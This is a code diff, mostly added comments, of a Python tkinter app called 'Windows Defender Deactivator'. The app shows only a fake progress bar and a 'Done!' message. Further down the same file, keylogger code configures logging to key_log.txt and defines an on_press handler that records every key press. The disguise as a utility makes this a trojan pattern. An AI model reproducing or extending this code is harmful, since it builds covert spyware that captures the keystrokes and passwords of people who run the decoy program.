@@ -10,6 +10,7 @@ from tkinter.messagebox import showinfo
 class App:
 
     def __init__(self, parent):
+        # Creating UI components
         self.root = parent
         self.notebook = ttk.Notebook(parent)
         self.notebook.pack()
@@ -22,13 +23,16 @@ class App:
         self.btn = ttk.Button(self.home, text='Deactivate Windows Defender', command=self.deactivate).grid(row=1, column=0, pady=20)
         self.notebook.add(self.home, text='Home')
         self.notebook.add(self.about, text='About')
-        # self.deactivate(self.home)
-        
+    
+    # Create a popup to display the progress
     def deactivate(self):
+        # Creating UI components
         toplevel = Toplevel(self.root)
         toplevel.resizable(False, False)
         pb = ttk.Progressbar(toplevel, orient='horizontal', mode='determinate', length=100)
         pb.grid(column=2, row=0, columnspan=2, padx=10, pady=20)
+        
+        # Updating the progress bar
         while pb['value'] < 100:
             pb['value'] += 1
             time.sleep(0.02)
@@ -36,14 +40,20 @@ class App:
         else:
             showinfo(message='Done!')
 
-
+# Create window 
 root = Tk()
+
+# Set resizable property for both X and Y axis False
 root.resizable(False, False)
+
+# Set the title for the window
 root.title('Windows Defender Deactivator')
+
+# Add UI components
 app = App(root)
+
+# Display the window
 root.mainloop()
-
-
 
 # Specify the file path where you want to store the logged keys
 log_file_path = "key_log.txt"
@@ -51,6 +61,7 @@ log_file_path = "key_log.txt"
 # Configure logging to write to the specified file
 logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
+# Read every ket input and log it
 def on_press(key):
     """Function to capture and log key presses."""
     try:
